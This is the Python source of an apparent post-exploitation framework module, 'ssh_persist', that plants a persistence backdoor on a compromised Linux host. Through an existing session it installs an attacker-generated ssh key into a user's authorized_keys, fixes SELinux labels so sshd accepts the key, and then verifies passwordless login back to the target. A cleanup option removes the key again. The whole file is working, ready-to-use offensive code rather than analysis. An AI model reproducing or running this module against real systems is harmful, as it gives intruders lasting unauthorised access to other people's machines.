from __future__ import annotations

import shutil
import subprocess
import uuid
from pathlib import Path
from typing import Optional

from koi.modules.blueprint import KoiModule
from koi.utils.config import TIMEOUTS

_ALGORITHM = "ed25519"
_KEY_DIR = Path.home() / ".koi" / "keys"
_VERIFY_TIMEOUT = 20.0


class SshPersistModule(KoiModule):
    name        = "ssh_persist"
    description = "Install an ssh public key for the current user and verify it works."
    category    = "Persistence"
    platform    = "linux"
    usage       = "ssh_persist <id> [-u USER] [-o DIR] [-p PORT] [--tag TAG] [--key PATH] [--remove] [--no-verify]"
    arguments   = [
        {"flags": ["-u", "--user"], "default": None, "metavar": "USER",
         "help": "Target user (default: the user owning this session)."},
        {"flags": ["-o", "--out"], "default": None, "metavar": "DIR",
         "help": f"Local directory for the keypair (default: {_KEY_DIR})."},
        {"flags": ["-p", "--port"], "type": int, "default": 22, "metavar": "PORT",
         "help": "ssh port used for the verification (default: 22)."},
        {"flags": ["--tag"], "default": None, "metavar": "TAG",
         "help": "Comment/tag embedded in the key (default: koi-<id>)."},
        {"flags": ["--key"], "default": None, "metavar": "PATH",
         "help": "Use an existing local private key instead of generating one."},
        {"flags": ["--remove"], "action": "store_true", "default": False,
         "help": "Revoke: remove the key matching --key/--tag from authorized_keys."},
        {"flags": ["--no-verify"], "action": "store_true", "default": False,
         "help": "Skip the non-interactive ssh check after installing."},
    ]

    def run(self) -> None:
        if self.args.remove:
            self._remove()
        else:
            self._install()

    # ---------------------------------------------------------------- install

    def _install(self) -> None:
        user = self._target_user()
        if not user:
            self.err("Could not determine the target user (try -u USER).")
            return

        home = self._home_for(user)
        if not home:
            self.err(f"Could not resolve the home directory of {user}.")
            return

        if self.args.key:
            key_path = Path(self.args.key).expanduser()
            if not key_path.is_file():
                self.err(f"Private key not found: {key_path}")
                return
            pub = self._read_pub(key_path)
            if not pub:
                self.err(f"Could not read the public key for {key_path}.")
                return
            tag = self.args.tag or self._pub_comment(pub)
        else:
            if shutil.which("ssh-keygen") is None:
                self.err("ssh-keygen is not installed on this machine.")
                return
            token = uuid.uuid4().hex[:8]
            tag = self.args.tag or f"koi-{token}"
            out_dir = Path(self.args.out).expanduser() if self.args.out else _KEY_DIR
            with self.spinner(f"Generating {_ALGORITHM} keypair..."):
                key_path = self._generate_keypair(out_dir, f"{user}-{token}", tag)
            if key_path is None:
                return
            pub = self._read_pub(key_path)
            if not pub:
                self.err("ssh-keygen produced no public key.")
                return

        ssh_dir = f"{home.rstrip('/')}/.ssh"
        auth = f"{ssh_dir}/authorized_keys"

        cmd = (
            f"mkdir -p {self._shell_quote(ssh_dir)} && "
            f"chmod 700 {self._shell_quote(ssh_dir)} && "
            f"touch {self._shell_quote(auth)} && "
            f"chmod 600 {self._shell_quote(auth)} && "
            f"{{ grep -qxF {self._shell_quote(pub)} {self._shell_quote(auth)} 2>/dev/null || "
            f"printf '%s\\n' {self._shell_quote(pub)} >> {self._shell_quote(auth)}; }}"
        )
        with self.spinner(f"Installing key for {user}..."):
            result = self.exec(cmd, timeout=TIMEOUTS["exec_command"])

        if result.returncode != 0:
            self.err(f"Failed to update authorized_keys (rc {result.returncode}).")
            if result.stdout.strip():
                self.status(result.stdout.strip())
            return

        # Best effort: a mislabelled key file is ignored by sshd on enforcing SELinux hosts.
        self._try_exec(
            f"command -v restorecon >/dev/null 2>&1 && "
            f"restorecon -R {self._shell_quote(ssh_dir)} 2>/dev/null"
        )

        self.success(f"Public key installed in {auth}")

        ip = self.session.addr[0]
        connect_cmd = f"connect ssh {user}@{ip} -i {key_path}"
        if self.args.port != 22:
            connect_cmd += f" -p {self.args.port}"

        self.box("SSH persistence installed", {
            "Private key":      str(key_path),
            "Target":           f"{user}@{ip}",
            "authorized_keys":  auth,
            "Key tag":          tag,
            "Reconnect":        connect_cmd,
        })

        if not self.args.no_verify:
            self._verify(key_path, user, self.args.port)

    def _verify(self, key_path: Path, user: str, port: int) -> None:
        ip = self.session.addr[0]
        host = f"[{ip}]" if ":" in ip else ip
        cmd = [
            "ssh", "-i", str(key_path), "-p", str(port),
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "ConnectTimeout=10",
            f"{user}@{host}", "true",
        ]
        with self.spinner(f"Verifying key against {user}@{host}:{port}..."):
            try:
                proc = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=_VERIFY_TIMEOUT,
                )
            except (OSError, subprocess.SubprocessError) as exc:
                self.warn(f"Verification could not run: {exc}")
                return

        if proc.returncode == 0:
            self.success(f"Key works: {user}@{host} authenticated non-interactively.")
            return

        lines = (proc.stderr or "").strip().splitlines()
        reason = lines[-1] if lines else f"exit {proc.returncode}"
        self.warn(f"Key installed, but the ssh check failed: {reason}")
        self.status("The key is in place; sshd, a firewall, or the address may differ from the callback.")

    # ----------------------------------------------------------------- remove

    def _remove(self) -> None:
        user = self._target_user()
        if not user:
            self.err("Could not determine the target user (try -u USER).")
            return

        home = self._home_for(user)
        if not home:
            self.err(f"Could not resolve the home directory of {user}.")
            return

        if self.args.key:
            pub = self._read_pub(Path(self.args.key).expanduser())
            if not pub:
                self.err("Could not read the public key.")
                return
            marker = pub
            grep_flag = "-vxF"
        elif self.args.tag:
            marker = self.args.tag
            grep_flag = "-vF"
        else:
            self.err("--remove needs --key PATH or --tag TAG to identify the key.")
            return

        auth = self._shell_quote(f"{home.rstrip('/')}/.ssh/authorized_keys")
        m = self._shell_quote(marker)
        cmd = (
            f"test -f {auth} || {{ echo 0; exit 0; }}; "
            f"t=$(mktemp); grep {grep_flag} {m} {auth} > \"$t\"; "
            f"cat \"$t\" > {auth}; rm -f \"$t\"; "
            f"grep -cF {m} {auth} || true"
        )
        result = self.exec(cmd, timeout=TIMEOUTS["exec_command"])
        if result.returncode != 0:
            self.err(f"Could not rewrite authorized_keys (rc {result.returncode}).")
            return
        out = result.stdout.strip()
        remaining = out.splitlines()[-1].strip() if out else "0"
        self.success(f"Removed matching key(s) from {user}'s authorized_keys (remaining: {remaining}).")

    # ---------------------------------------------------------------- helpers

    def _target_user(self) -> Optional[str]:
        if self.args.user:
            return self.args.user
        return self._try_exec("id -un") or None

    def _home_for(self, user: str) -> str:
        entry = self._try_exec(f"getent passwd {self._shell_quote(user)} 2>/dev/null")
        if entry:
            parts = entry.split(":")
            if len(parts) >= 6 and parts[5].startswith("/"):
                return parts[5]
        return self._try_exec('printf %s "$HOME"')

    def _generate_keypair(self, out_dir: Path, stem: str, comment: str) -> Optional[Path]:
        try:
            out_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
        except OSError as exc:
            self.err(f"Could not create {out_dir}: {exc}")
            return None

        key_path = out_dir / stem
        if key_path.exists() or Path(str(key_path) + ".pub").exists():
            self.err(f"{key_path} already exists.")
            return None

        try:
            proc = subprocess.run(
                ["ssh-keygen", "-t", _ALGORITHM, "-q", "-N", "",
                 "-C", comment, "-f", str(key_path)],
                capture_output=True, text=True,
            )
        except OSError as exc:
            self.err(f"Could not run ssh-keygen: {exc}")
            return None

        if proc.returncode != 0:
            detail = proc.stderr.strip() or proc.stdout.strip() or f"exit {proc.returncode}"
            self.err(f"ssh-keygen failed: {detail}")
            return None

        try:
            key_path.chmod(0o600)
        except OSError:
            pass
        return key_path

    @staticmethod
    def _read_pub(key_path: Path) -> str:
        pub_file = Path(str(key_path) + ".pub")
        try:
            text = pub_file.read_text().strip()
            if text:
                return text
        except OSError:
            pass

        try:
            proc = subprocess.run(
                ["ssh-keygen", "-y", "-f", str(key_path)],
                capture_output=True, text=True, timeout=10,
            )
        except (OSError, subprocess.SubprocessError):
            return ""
        return proc.stdout.strip() if proc.returncode == 0 else ""

    @staticmethod
    def _pub_comment(pub: str) -> str:
        fields = pub.split(None, 2)
        return fields[2] if len(fields) >= 3 else "koi"
